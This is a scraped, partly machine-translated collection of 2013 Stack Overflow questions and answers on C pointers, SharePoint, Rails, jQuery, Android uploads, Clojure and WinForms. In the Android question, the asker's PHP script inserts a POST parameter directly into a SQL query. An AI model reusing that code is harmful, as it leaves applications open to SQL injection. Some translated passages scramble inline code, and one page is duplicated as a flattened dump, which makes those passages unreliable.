    int n = ...;
    int* t = malloc(sizeof(int) * n);
    /* ... */
    array_push(&t, &n, 2);
    /* ... */
    free(t);
} 
```

请注意我如何在堆上分配，并在内部`t`释放. 考虑到这一点，可以通过使用来简化 的大部分逻辑：`*array_pointer``array_push()``array_push()``realloc()`

```
void array_push(int **array_pointer, int *array_length, int val) {
    *array_pointer = realloc(*array_pointer, sizeof(int) * (*array_length + 1));
    (*array_pointer)[(*array_length)++] = val;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-06T06:23:30.387

这里有两个问题：您似乎对按值传递感到困惑，但更重要的问题是您似乎对指针感到困惑。`int *array_pointer`array_pointer 指向一个`int`，而不是一个数组。它可能指向`int`数组中的第一个。在不相关的注释中，“指向 int 数组的指针”看起来像：`int (*array_pointer)[array_length]`。

回到正题：`int *array_pointer`array_pointer 指向一个`int`. 在`*array_pointer = temp_array;`中，表达式`*array_pointer`为您提供指向的对象，该对象可以存储`int`. `temp_array`不过，这不是一个`int`值。

我可以看到您正在尝试解决`array_pointer`由于按值传递的语义而导致的更改对调用者不可见的问题。因此，您需要更改`array_pointer`它以使其指向`int *`调用者提供的 ，以便您修改调用者的`int *`，或使用返回类型来返回新指针。事实证明，这两个选项都可以解决您的两个问题。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-06T06:11:13.517

问题1：

如果要在函数内部创建或修改 *int 数组，则需要传递“指向指针的指针”：

```
// WRONG:
void array_push(int *array_pointer, int array_length, int val) {
...
    int *temp_array = malloc(sizeof(int) * (array_length + 1));
...
    *array_pointer = temp_array; 
```

反而：

```
// BETTER:
void array_push(int **array_pointer, int array_length, int val) {
...
    int *temp_array = malloc(sizeof(int) * (array_length + 1));
...
    *array_pointer = temp_array; 
```

或者：

```
// BETTER YET:
int * array_push(int array_length, int val) {
...
    int *temp_array = malloc(sizeof(int) * (array_length + 1));
...
return temp_array; 
```

问题2：

如果你想像这样声明一个静态数组`int t[2] = {0,2};`，那么你不能随意改变它的大小。这是“数组与指针”的一个很好的描述：

> [http://faq.cprogramming.com/cgi-bin/smartfaq.cgi?answer=1069897882&id=1073086407](http://faq.cprogramming.com/cgi-bin/smartfaq.cgi?answer=1069897882&id=1073086407)
> 
> 新学生在学习 C 和 C++ 时学到的第一件事就是指针和数组是等价的。这与事实相去甚远……

# sharepoint - SharePoint 在哪里存储自定义内容类型和列表的 elements.xml 和 schema.xml？

> ID：15847668
> 
> 赞同：6
> 
> 时间：2013-04-06T06:08:28.930
> 
> 标签：sharepoint, sharepoint-2010

如标题中所述，我只是想找出自定义文件的存储位置以及`SharePoint 2010`是否`elements.xml`有人可以提供帮助。`schema.xml``content types``list definitions`

我想做的是在浏览器的 SharePoint GUI 中设计我的自定义内容类型和列表，然后提取 SharePoint 生成的文件，以便在 Visual Studio 中构建的解决方案中使用，而不是从头开始手动编码所有内容.

希望这是有道理的！谢谢！

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-04-06T12:55:40.873

您不会发现它们存储在您的硬盘上，而是存储在您的 Content_DB 中。

如果您需要访问它们以获取架构，您可以使用[SharePoint Manager 2010](http://spm.codeplex.com)并从中导航到您的内容类型并复制架构 Xml 选项卡。

![在此处输入图像描述](https://i.stack.imgur.com/kKIlh.png)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-06T11:11:24.820

这里`"C:\Program Files\Common Files\Microsoft Shared\Web Server Extensions\14\TEMPLATE\FEATURES"`

例如，`"Contact List Template" located at "C:\Program Files\Common Files\Microsoft Shared\Web Server Extensions\14\TEMPLATE\FEATURES\ContactsList"`

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-10T06:31:27.637

医学博士。亚辛是对的。Microsoft 的默认内置模板位于 14 hive 中，但用户自定义的任何内容都存储在该 Web 应用程序的内容数据库中。您可能会寻找的另一种常见方法是将网站另存为模板，然后基于该 WSP 创建一个 SharePoint 项目。这意味着一切都已经为您设置好了，您只需要从站点中删除您不想要的东西。

# ruby-on-rails - Rails locations: API Wrappers (Vaccum)

> ID：15847670
> 
> 赞同：0
> 
> 时间：2013-04-06T06:08:58.137
> 
> 标签：ruby-on-rails, ruby-on-rails-3, api, model-view-controller, wrapper

In Rails -

Where should I locate an API wrapper? Under `models`?

I put the `vaccum` wrapper there but I'm getting a `NoMethodError` in the Controller. How do I make sure it is working well?

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T08:28:14.163

你是说`vacuum`包装吗？你要么把它放在模型层，要么为它创建一个单独的服务层，例如。您创建一个服务文件夹并在其中提供它。但是，为简单起见，我将从创建模型开始。

来自您的`NoMethodError`控制器的原因是因为 Rails 找不到您发送的方法。您可以发布控制器代码吗？

# javascript - 显示特定的 取决于值标签 我正在建立一个电子商务网站，在支付方式中我写 <select name="pay_method"> <option value="0" selected="selected">选择支付方式</option> <option value="1" >货到付款</option> <option value="2">信用卡</option> <option value="3" 问问题 问问题 2013-04-06T06:09:05.843 3578 次 This question shows research effort; it is useful and clear 0 This question does not show any research effort; it is unclear or not useful Bookmark this question. Show activity on this post. javascriptjqueryhtmlhtml-select 4 6 回答 6 This answer is useful 1 简单的 关于选择框的更改事件 $("#pay_method").change(function(){ //Hide alldivshere $("#div").css("display","none") . . if($(this).val()=="1") $("#div").css("display","block") else if($(this).val()=="2") $("#div").css("display","block") . . }); 于 2013-04-06T06:16:35.177 回答 This answer is useful 1 最重要的是：考虑使用jQueryUI Accordion - 它实际上可以满足您的需求，而且需要的工作更少。 如果您想手动执行此操作，请跟踪 jQuery 事件change()并使用方法val()来获取所选值 - 正如其他答案中已经建议的那样。 看到这个小提琴。 HTML： <select id="pay_method" name="pay_method"> <option value="0" selected="selected">Select a Payment Method</option> <option value="1">Cash on Delivery</option> <option value="2">Credit Card</option> <option value="3">Debit Card</option> <option value="4">Netbanking</option> </select> <div id="cash_payment" class="payment_method"> You selected <strong>cash</strong> payment method. </div> <div id="credit_card_payment" class="payment_method"> You selected <strong>credit card</strong> payment method. </div> <div id="debit_card_payment" class="payment_method"> You selected <strong>debit card</strong> payment method. </div> <div id="netbanking_payment" class="payment_method"> You selected <strong>netbanking</strong> payment method. </div> JS： $("#pay_method").change(function() { $('.payment_method').slideUp(); switch($('#pay_method :selected').val()) { case '1': $('#cash_payment').slideDown(); break; case '2': $('#credit_card_payment').slideDown(); break; case '3': $('#debit_card_payment').slideDown(); break; case '4': $('#netbanking_payment').slideDown(); break; } }); 于 2013-04-06T06:21:59.427 回答 This answer is useful 1 https://stackoverflow.com/questions/how-to-ask http://api.jquery.com/ LIVE DEMO CSS： .hide{ display:none; } jQuery： $(function(){ // DOM ready $('[name=pay_method]').change(function(){ $('.hide').hide() $('[data-panel='+ this.value +']').show(); }); }); HTML： <select name="pay_method"> <option value="0" selected="selected">Select a Payment Method</option> <option value="1">Cash on Delivery</option> <option value="2">Credit Card</option> <option value="3">Debit Card</option> <option value="4">Netbanking</option> </select> <div class="hide" data-panel="1">Cash on Delivery</div> <div class="hide" data-panel="2">Credit Card</div> <div class="hide" data-panel="3">Debit Card</div> <div class="hide" data-panel="4">Netbanking</div> 于 2013-04-06T06:24:24.733 回答 This answer is useful 0 var a = $("#pay_method :selected").val(); switch (a){ case 1: HideAll() $("#div1").show(); case 2: HideAll() $("#div2").show(); case 3: HideAll() $("#div3").show(); case 4: HideAll() $("#div4").show(); } function HideAll(){ $("#div1").hide(); //hide other three divs also } 于 2013-04-06T06:15:41.220 回答 This answer is useful 0 $(document).ready(function () { $('#ddlPayment').change(function () { if($("#ddlPayment option:selected").val()==2) $('#creditcard').show(); }); }); JS小提琴 <select name="pay_method" id="ddlPayment"> <option value="0" selected="selected">Select a Payment Method</option> <option value="1">Cash on Delivery</option> <option value="2">Credit Card</option> <option value="3">Debit Card</option> <option value="4">Netbanking</option> </select> <div id="creditcard" style="display:none;"> credit card details <input type="text" /> </div> 于 2013-04-06T06:22:36.130 回答 This answer is useful 0 尝试这个 <select id="pay_method"> <option value="0" selected="selected">Select a Payment Method</option> <option value="1">Cash on Delivery</option> <option value="2">Credit Card</option> <option value="3">Debit Card</option> <option value="4">Netbanking</option> </select> <div id="1" class="Payment">Cash on Delivery Details</div> <div id="2" class="Payment">Credit Card Details</div> <div id="3" class="Payment">Debit Card Details</div> <div id="4" class="Payment">Netbanking Details</div> <script type="text/javascript"> $(function() { $('#pay_method').change(function(){ $('.Payment').hide(); $('#' + $(this).val()).show(); }); }); </script> 于 2013-04-06T06:26:36.197 回答 Related 1 android - 片段作为 Android 中的单例 3 javascript - 内容超出 div 但没有滚动条 1 ms-access-2003 - ACCESS 2003：在更新之前检查记录是否存在，然后显示消息然后打开现有记录 6 android - 由于“java.lang.IllegalAccessError”，检测运行失败 2 php - 在 PHP 中使用 Imagick 调整 .eps 的大小并另存为 .jpg 3 ruby-on-rails - 将多个变量传递给部分 1 git - 在 git 分支工作。我可以变基以保持分支更新吗？ 1 mysql - 使用 perl DBI 显示 CREATE PROCEDURE 不一致的结果 1 android - 我想在eclipse中打开acra项目 3 apache - 未触发 RewriteRule Reference php × 1429865 c/c++ × 756500 nginx × 49975 mongodb × 159057 mybatis × 3233 anaconda × 13410 pycharm × 14671 python × 1902243 vscode × 56040 docker × 110988 github × 49000 flask × 49129 ffmpeg × 24037 jmeter × 16910 matplotlib × 63493 bootstrap × 54641

> ID：15847671
> 
> 赞同：0
> 
> 时间：
> 
> 标签：javascript, jquery, html, html-select

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T06:16:35.177

简单的

关于选择框的更改事件

```
$("#pay_method").change(function(){
  //Hide alldivshere
  $("#div").css("display","none")
 .
 .
  if($(this).val()=="1")
   $("#div").css("display","block")
  else if($(this).val()=="2")
   $("#div").css("display","block")
  .
  .     
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-06T06:21:59.427

*最重要*的是：考虑使用**[jQueryUI Accordion](http://jqueryui.com/accordion/)** - 它实际上可以满足您的需求，而且需要的工作更少。

如果您想手动执行此操作，请跟踪 jQuery 事件`change()`并使用方法`val()`来获取所选值 - 正如其他答案中已经建议的那样。

看到[这个小提琴](http://jsfiddle.net/vovkss/CSKDK/)。

**HTML**：

```
<select id="pay_method" name="pay_method">
  <option value="0" selected="selected">Select a Payment Method</option>
  <option value="1">Cash on Delivery</option>
  <option value="2">Credit Card</option>
  <option value="3">Debit Card</option>
  <option value="4">Netbanking</option>
</select>

<div id="cash_payment" class="payment_method">
  You selected <strong>cash</strong> payment method. 
</div>
<div id="credit_card_payment" class="payment_method">
  You selected <strong>credit card</strong> payment method. 
</div>
<div id="debit_card_payment" class="payment_method">
  You selected <strong>debit card</strong> payment method. 
</div>
<div id="netbanking_payment" class="payment_method">
  You selected <strong>netbanking</strong> payment method. 
</div> 
```

**JS**：

```
$("#pay_method").change(function()
{
  $('.payment_method').slideUp();
  switch($('#pay_method :selected').val())
  {
    case '1': $('#cash_payment').slideDown(); break;
    case '2': $('#credit_card_payment').slideDown(); break;
    case '3': $('#debit_card_payment').slideDown(); break;
    case '4': $('#netbanking_payment').slideDown(); break;
  }
}); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-06T06:24:24.733

[https://stackoverflow.com/questions/how-to-ask](https://stackoverflow.com/questions/how-to-ask)
[http://api.jquery.com/](http://api.jquery.com/)

`**[LIVE DEMO](http://jsbin.com/odonuf/3/edit)**`

CSS：

```
.hide{ display:none; } 
```

jQuery：

```
$(function(){ // DOM ready

    $('[name=pay_method]').change(function(){
      $('.hide').hide()
      $('[data-panel='+ this.value +']').show(); 
    });

}); 
```

HTML：

```
<select name="pay_method">
  <option value="0" selected="selected">Select a Payment Method</option>
  <option value="1">Cash on Delivery</option>
  <option value="2">Credit Card</option>
  <option value="3">Debit Card</option>
  <option value="4">Netbanking</option>
</select>

<div class="hide" data-panel="1">Cash on Delivery</div>
<div class="hide" data-panel="2">Credit Card</div>
<div class="hide" data-panel="3">Debit Card</div>
<div class="hide" data-panel="4">Netbanking</div> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-06T06:15:41.220

```
 var a =    $("#pay_method :selected").val();
     switch (a){
       case 1:
           HideAll()
           $("#div1").show();

       case 2:
           HideAll()
           $("#div2").show();
       case 3:
             HideAll()
           $("#div3").show();    
       case 4:
           HideAll()
           $("#div4").show();

             }

function HideAll(){

                   $("#div1").hide();

                 //hide other three divs also

                 } 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-04-06T06:22:36.130

```
$(document).ready(function () {
    $('#ddlPayment').change(function () {

       if($("#ddlPayment option:selected").val()==2)
             $('#creditcard').show();

      });
}); 
```

[JS小提琴](http://jsfiddle.net/rahularyansharma/PfEVd/2/)

```
<select name="pay_method" id="ddlPayment">
    <option value="0" selected="selected">Select a Payment Method</option>
    <option value="1">Cash on Delivery</option>
    <option value="2">Credit Card</option>
    <option value="3">Debit Card</option>
    <option value="4">Netbanking</option>
</select>
<div id="creditcard" style="display:none;">
    credit card details 
    <input type="text" />
</div> 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-04-06T06:26:36.197

尝试这个

```
<select id="pay_method">
  <option value="0" selected="selected">Select a Payment Method</option>
  <option value="1">Cash on Delivery</option>
  <option value="2">Credit Card</option>
  <option value="3">Debit Card</option>
  <option value="4">Netbanking</option>
</select>
<div id="1" class="Payment">Cash on Delivery Details</div>
<div id="2" class="Payment">Credit Card Details</div>
<div id="3" class="Payment">Debit Card Details</div>
<div id="4" class="Payment">Netbanking Details</div>

<script type="text/javascript">
 $(function() {
        $('#pay_method').change(function(){
            $('.Payment').hide();
            $('#' + $(this).val()).show();
        });
    });
</script> 
```

# android - Scroll two layouts at different speed simultaneously

> ID：15847673
> 
> 赞同：2
> 
> 时间：2013-04-06T06:09:16.490
> 
> 标签：android, android-scrollview, android-scroll

I have a frame layout which Contains Two layouts with scrollviews. The scrollViews are independent of one another.

What I want to achieve is when I scroll through top layout, the layout in the background should also scroll but at different speed. For example if I am scrolling up the background layout should scroll at half the speed of the scrolling on the top layout.

Do anyone know how can I implement this functionality?If you have any other good way to implement this, please suggest. Thanks.

# android - how to pass date to server using HttpURLConnection?

> ID：15847674
> 
> 赞同：0
> 
> 时间：2013-04-06T06:09:30.590
> 
> 标签：android

```
myphp script on server side

    <?php

     // include db connect class
     require_once __DIR__ . '/db_connect.php';

     // connecting to db
     $db = new DB_CONNECT();

    $tvshowname = (isset($_POST['username']) ? $_POST['username'] : null);

    $result=mysql_query("INSERT INTO test(imagename) VALUES ('$tvshowname')");

    $target_path1 = "http://" + "10.0.2.2/tvshow/tvshow_images/";

    //$target_path1 = "10.0.2.2/tvshow/tvshow_images/";

    //$target_path1 = 'http://10.0.2.2/tvshow/tvshow_images/';

    /* Add the original filename to our target path.
    Result is "uploads/filename.extension" */
    $target_path1 = $target_path1 . basename( $_FILES['uploaded_file']['name']);
    if(move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $target_path1)) {
        echo "The first file ".  basename( $_FILES['uploaded_file']['name']).
        " has been uploaded.";
    } else{
        echo "There was an error uploading the file, please try again!";
        echo "filename: " .  basename( $_FILES['uploaded_file']['name']);
        echo "target_path: " .$target_path1;
    }

    ?>

@SuppressWarnings("deprecation")
        @Override
        protected String doInBackground(String... f_url) {

            HttpURLConnection connection = null;
            DataOutputStream outputStream = null;

            String pathToOurFile = UploadFilePath;

            String urlServer = "http://" + "10.0.2.2"
                    + "/tvshow/upload_tvshows.php?username=" +"niranga"+"";

            //"&tvshowchannel="+"sirasa tv"+"&tvshowtype="
            //+ "dailytelegrama" + "&tvshowdescription="+"nvnnnnnnnnnnn";

            String lineEnd = "\r\n";
            String twoHyphens = "--";
            String boundary = "*****";

            int bytesRead, bytesAvailable, bufferSize;
            byte[] buffer;
            int maxBufferSize = 1 * 1024 * 1024;

            try {
                FileInputStream fileInputStream = new FileInputStream(new File(

                        pathToOurFile));

                URL url = new URL(urlServer);
                connection = (HttpURLConnection) url.openConnection();

                // Allow Inputs & Outputs
                connection.setDoInput(true);
                connection.setDoOutput(true);
                connection.setUseCaches(false);

                // Enable POST method
                connection.setRequestMethod("POST");

                //connection.setRequestProperty("username","niranga" );

                connection.setRequestProperty("Connection", "Keep-Alive");
                connection.setRequestProperty("Content-Type",
                        "multipart/form-data;boundary=" + boundary);

                outputStream = new DataOutputStream(
                        connection.getOutputStream());
                outputStream.writeBytes(twoHyphens + boundary + lineEnd);

                outputStream.writeBytes("Content-Disposition: form-data; name=\"uploaded_file\";filename=\""+ pathToOurFile + "\"" +";username=\""+"niranga"+ lineEnd);

                outputStream.writeBytes(lineEnd);

                bytesAvailable = fileInputStream.available();
                bufferSize = Math.min(bytesAvailable, maxBufferSize);
                buffer = new byte[bufferSize];

                // Read file
                bytesRead = fileInputStream.read(buffer, 0, bufferSize);

                while (bytesRead > 0) {
                    for (int x = 0; x < 100; x++) {
                        // publishing the progress....
                        // After this onProgressUpdate will be called
                        publishProgress("" + x);
                    }
                    outputStream.write(buffer, 0, bufferSize);
                    bytesAvailable = fileInputStream.available();
                    bufferSize = Math.min(bytesAvailable, maxBufferSize);
                    bytesRead = fileInputStream.read(buffer, 0, bufferSize);
                }

                outputStream.writeBytes(lineEnd);
                outputStream.writeBytes(twoHyphens + boundary + twoHyphens
                        + lineEnd);

                // Responses from the server (code and message)
                int serverResponseCode = connection.getResponseCode();
                String serverResponseMessage = connection.getResponseMessage();

                //print server response here..
                Log.e("---------",(serverResponseCode + " ===> "
                        + serverResponseMessage));

                fileInputStream.close();
                outputStream.flush();
                outputStream.close();

            } catch (final Exception ex) {

                runOnUiThread(new Runnable() {
                      public void run() {

                AlertDialog alertDialog = new AlertDialog.Builder(
                        AddTVShows.this).create();

                // Setting Dialog Title
                alertDialog.setTitle("Alert Dialog");

                Log.e("Erorrr",ex.toString());

                // Setting Dialog Message
                alertDialog.setMessage(ex.toString());

                // Setting OK Button
                alertDialog.setButton("Upload Again",
                        new DialogInterface.OnClickListener() {

                            public void onClick(DialogInterface dialog,
                                    int which) {

                                // Write your code here to execute after dialog
                                // closed
                                //Toast.makeText(getApplicationContext(), "",
                                //      Toast.LENGTH_SHORT).show();
                            }
                        });

                // Showing Alert Message
                alertDialog.show();

                      }
                });
            }

            return null;

        }

i want to pass username parameter to serverside php script using HttpURLConnection.i use below url to do that .but username value not taking from server side php script.please help me to get username from server side php script.... 
```

i want to sent username value to server side php script tobe inserted to database.but it inserted null values..

String urlServer = "http://" + "10.0.2.2" + "/tvshow/upload_tvshows.php?username=" +"niranga"+"";

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T06:13:41.370

[http://developer.android.com/reference/org/apache/http/client/methods/HttpPost.html](http://developer.android.com/reference/org/apache/http/client/methods/HttpPost.html)

You need a make HTTP post request to the url. Also you should use Asyntask

```
public void postData() {
// Create a new HttpClient and Post Header
HttpClient httpclient = new DefaultHttpClient();
HttpPost httppost = new HttpPost("http://www.yoursite.com/script.php");

try {
    // Add your data
    List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(2);
    nameValuePairs.add(new BasicNameValuePair("id", "12345"));
    nameValuePairs.add(new BasicNameValuePair("stringdata", "AndDev is Cool!"));
    httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));

    // Execute HTTP Post Request
    HttpResponse response = httpclient.execute(httppost);

} catch (ClientProtocolException e) {
    // TODO Auto-generated catch block
} catch (IOException e) {
    // TODO Auto-generated catch block
}
} 
```

# clojure - fmap 在哪里（或如何将 fn 应用于地图的每个值）

> ID：15847681
> 
> 赞同：6
> 
> 时间：2013-04-06T06:10:33.733
> 
> 标签：clojure

我正在尝试将函数应用于地图的每个值。[`fmap`](http://clojuredocs.org/clojure_contrib/clojure.contrib.generic.functor/fmap)做这项工作。但是它移动到了哪个命名空间？

我也写了下面的实现，但我认为这可能会更好 -

```
(defn map-over
  [f m]
  (->>
   (map (fn [[k v]]
         {k (f v)})
        m)
   (into {}))) 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-04-06T07:51:42.503

[迁移页面](http://dev.clojure.org/display/community/Where+Did+Clojure.Contrib+Go)显示已`clojure.contrib.generic`迁移到[`algo.generic`](https://github.com/clojure/algo.generic/).

# xml - 存储配置的最佳方式

> ID：15847682
> 
> 赞同：1
> 
> 时间：2013-04-06T06:10:35.270
> 
> 标签：xml, database, json, configuration, resource-management

我正在实现一个具有完整 API 的配置管理器，类似于 Windows 注册表。我希望它是人类可读的，因为能够使用文本编辑器打开和编辑它。我希望它能够存储程序可能需要的任何类型的配置信息，并且速度足够快以备不时之需。

我查看了以下用于存储信息的标记语言：

*   XML
*   JSON
*   YAML
*   S-表达

但我不确定哪种语言适合这项任务。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2017-08-03T11:22:36.303

我知道这已经很晚了，但我建议你使用**YAML**。非常易于阅读，它被广泛用于配置，可以满足您的需求“***我希望它能够存储程序可能需要的任何类型的配置信息***”。它唯一的缺点是使用空格的缩进样式，你必须非常小心，因为错误的缩进意味着对内容的不同解释。一旦你习惯了它，它就非常容易使用。

# ruby-on-rails - Rails locations - where do I locate a gem

> ID：15847697
> 
> 赞同：0
> 
> 时间：2013-04-06T06:11:57.963
> 
> 标签：ruby-on-rails, ruby-on-rails-3, model-view-controller, twitter-bootstrap, rubygems

In Rails -

Where should I locate Gems? I downloaded bootstrap and it's working, as well as a sample Rails app, separately, but I want them to work together. There is a `bootstrapped rails` gem ([http://rubygems.org/gems/bootstrapped-rails](http://rubygems.org/gems/bootstrapped-rails)) which I downloaded, but I'm unsure as to where I should locate it. Under `models`? And how do I make sure I am referring to it? I need to add something in `controller` as well?

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-04-03T14:47:13.523

同样，更多的是对标题中问题的回答，而不是提问者的意图，但您可以使用

```
bundle show <gemname> 
```

找到安装 gem 的目录。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-06T06:32:00.070

正如 Dfr 提到的：[https ://github.com/seyhunak/twitter-bootstrap-rails](https://github.com/seyhunak/twitter-bootstrap-rails)

Twitter bootstrap 只不过是（大部分）css/js/image 文件的集合。

将此添加到您的 gemfile

```
gem "twitter-bootstrap-rails" 
```

跑

```
bundle install 
```

运行简单的 css

```
rails generate bootstrap:install static 
```

它应该将相关的 js 和 css 文件相应地放入您的 application.js 和 application.css 文件中。（阅读有关资产管道的更多信息）

为了让您开始，在 gem 的链接中 - “生成布局和视图”部分下，您可以看到 rake 任务以生成示例布局。

例如

```
rails g bootstrap:layout application fixed 
```

您现在应该在视图/布局下有一个 twitter-bootstraped application.html.erb 文件。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-06T06:35:14.343

要回答标题中的问题，您可以通过`gem env`在控制台中运行来找到您的 gem。这将为您提供有关“RubyGems 环境”的特定信息：当您运行`gem install some_gem_name`它时，它将将此 gem 添加到您的系统中。

但是，听起来您尝试做的是将 a 添加`gem`到您的应用程序中。如果是这种情况，您可以将 gem 添加到 rails 应用程序的`Gemfile`.

因此，使用您的示例，您将找到您的 Gemfile 并添加以下内容：

```
gem "bootstrapped-rails", "~> 2.0.8.5" 
```

完成后，您将`bundle install`在终端中运行。

我发现可以在这里找到一个很好的基本 Rails 信息资源：http: [//guides.rubyonrails.org/getting_started.html](http://guides.rubyonrails.org/getting_started.html) 该教程很短，它会给你一个很好的起点。

# c - 将小数转换为分数表达式的算法

> ID：15847700
> 
> 赞同：1
> 
> 时间：2013-04-06T06:12:48.590
> 
> 标签：c, haskell

假设我有一个小数

```
0.30000000000000027 
```

知道用分数表示的相同数字的最佳算法是什么所以给定满足c或haskell的某些`x`发现`y``x=1/y`

我刚在想

```
 1/3> 0.30 >1/4 
```

迭代左侧和右侧，直到其中一个收敛并`>`变为`=` 第一次迭代看起来像

```
1/1  >  0.30000000000000027  > 1/somethinghere
1/2  >  0.30000000000000027  > 1/increase or decrease this 
1/3  >  0.30000000000000027 ... 
```

我想澄清一下，我可以很容易地做到

```
0.30000000000000027  =  30000000000000027/  10^17 
```

但我想做

```
0.30000000000000027 = 1/x 
```

在 c 或 haskell 中

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-06T06:22:46.157

瞧（几乎正确地转换为正常分数）：

```
int gcd(int a, int b)
{
    if (a == 0) return b;
    if (b == 0) return a;

    if (a > b)
        return gcd(b, a % b);
    else
        return gcd(a, b % a);
}

struct frac {
    int num;
    int denom;
};

struct frac to_frac(double x, int precision)
{
    int denom = 1;
    for (int i = 0; i < precision; i++) {
        denom *= 10;
    }

    int num = x * denom + 0.5; // hack: round if imprecise
    int gcdiv = gcd(num, denom);

    struct frac f;
    f.num = num / gcdiv;
    f.denom = denom / gcdiv;

    return f;
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-06T11:00:27.260

你研究过[连分数](http://en.wikipedia.org/wiki/Continued_fraction)吗？它们给出了非常好的数字近似值。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-06T06:27:28.500

不知道haskell，这里是伪代码：

```
raw_denom = 1/x;
print "1/" floor(raw_denom) " >= " x " >= 1/" ceil(raw_denom) 
```

# c# - Sql server 报告对齐到网页的中心

> ID：15847704
> 
> 赞同：2
> 
> 时间：2013-04-06T06:13:25.473
> 
> 标签：c#, asp.net, css, sql-server, reporting

我正在使用 SQL Server 报告服务生成报告并使用报告查看器控件显示它。它在页面左侧显示报告。我希望它居中对齐。

我试过关注事情，但没有成功。

1.  将报表查看器控件包装在`div`or中`table`并使其居中对齐。
2.  报表查看器控件的缩放模式。

所以请给我一些解决方案让它居中对齐。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-06T06:19:01.477

试试这样：

```
<div align="center">

    <rsweb:ReportViewer ID="ReportViewer1" runat="server" DocumentMapWidth="100%"

    Font-Names="Verdana" Font-Size="8pt" PromptAreaCollapsed="True"

    ShowToolBar="False" Width="1100px" Height="100%">

    </rsweb:ReportViewer>

</div> 
```

**或使用 JQUERY：**

```
$('#ReportViewer1_fixedTable tbody tr').attr("align", "center"); 
```

**或服务器端：**

```
ReportPageSettings rst = rptVwr.LocalReport.GetDefaultPageSettings();
            if (rptVwr.ParentForm.Width > rst.PaperSize.Width)
            {
                int vPad = (rptVwr.ParentForm.Width - rst.PaperSize.Width) / 2;
                rptVwr.Padding = new Padding(vPad, 1, vPad, 1);
            } 
```

【高宽调整】

希望它有帮助。

# .net - 如何构建更新通知？

> ID：15847708
> 
> 赞同：4
> 
> 时间：2013-04-06T06:13:46.587
> 
> 标签：.net, installation, wix

我们目前正在通过位于网络共享上的 wix 生成的 msi 安装我们的程序。当新版本准备好时，我会向所有需要该程序的人发送电子邮件。这很笨拙并且会产生很多问题 - 所以我想实现某种更新检查。有没有办法查看 msi 并找到内部版本号？然后我可以将它与我的程序集版本进行比较？有没有一个好的模式来做到这一点？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-06T13:26:57.070

WiX 工具集中有一个名为 ClickThrough 的休眠项目，其中内置了更新通知。本质上，有一个小的 update.exe 查看“应用程序联合提要”（ATOM 提要，带有一点标记来描述产品的版本信息）以确定可用版本，然后查看本地计算机并确定何时新版本可用。[您可以在WiX v3.8](http://wixtoolset.org/releases/feed/v3.8)（或任何 WiX 版本）的 WiX 工具集提要中看到“应用程序联合提要”的示例。

WiX Bootstrapper 应用程序有一个更小的实现，`src\Setup\WixBA\UpdateViewModel.cs`但该版本基于正在安装的 WiX 包（不是已经安装的）。你可能会发现它很有用。

如果您想了解有关“应用程序联合供稿”的更多详细信息，请随时与我联系。我在某个地方有一个规范，我需要更新并在互联网上的某个地方发布。:)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-06T11:54:51.773

推荐的方法是使用专门为 Windows Installer 程序包设计的更新程序。Google 为 Chrome 使用的一个不错的免费选项：[https ://code.google.com/p/omaha/](https://code.google.com/p/omaha/)

# c# - 如何使用标记名将 HTML 文件中定义的文本框的值保存到文本文件中

> ID：15847715
> 
> 赞同：2
> 
> 时间：2013-04-06T06:14:45.813
> 
> 标签：c#, html, webbrowser-control

我想将 webbrowser 中显示的文本区域的值保存在 txt 文件中，我想通过 GetelementbyTagName 而不是 GetelementbyID 来执行此操作 谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T06:18:56.233

在您的网页完成后，请执行以下操作：（对于 multi `textarea`）

```
 private void webBrowser1_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
        {
            foreach (HtmlElement el in webBrowser1.Document.GetElementsByTagName("textarea "))
            {
               if(el.GetAttribute("ClassName")=="classname")
               {
                File.WriteAllText("address of file", el.InnerText);
               }
            }
        } 
```

**编辑：**

对于单人`textarea`：

```
 foreach (HtmlElement el in webBrowser1.Document.GetElementsByTagName("textarea "))
                {
                    File.WriteAllText("address of file", el.InnerText);
                } 
```

# c# - 如何将文本从 C# Winform 中的另一个类附加到richTextBox？

> ID：15847716
> 
> 赞同：2
> 
> 时间：2013-04-06T06:14:46.063
> 
> 标签：c#, .net, winforms

我创建了一个名为的 Winform ，其名称`Form1`为 RichTextBox `richTextBox1`。我还创建了一个名为的方法`update`，它可以在richTextBox1 中显示消息。当我试图从中调用它时，`Class1`它不起作用。而我要在 MessageBox 中看到消息，而不是在`richTextBox1`. 这是一段代码。

代码：Form1.cs

```
public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        public void update(string message)
        {
            richTextBox1.AppendText("mess: " + message);
            MessageBox.Show(message);
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Class1 sample = new Class1();            
        } 
    } 
```

Class1.cs

```
public class Class1
    {        
        public Class1()
        {
            Form1 form = new Form1();
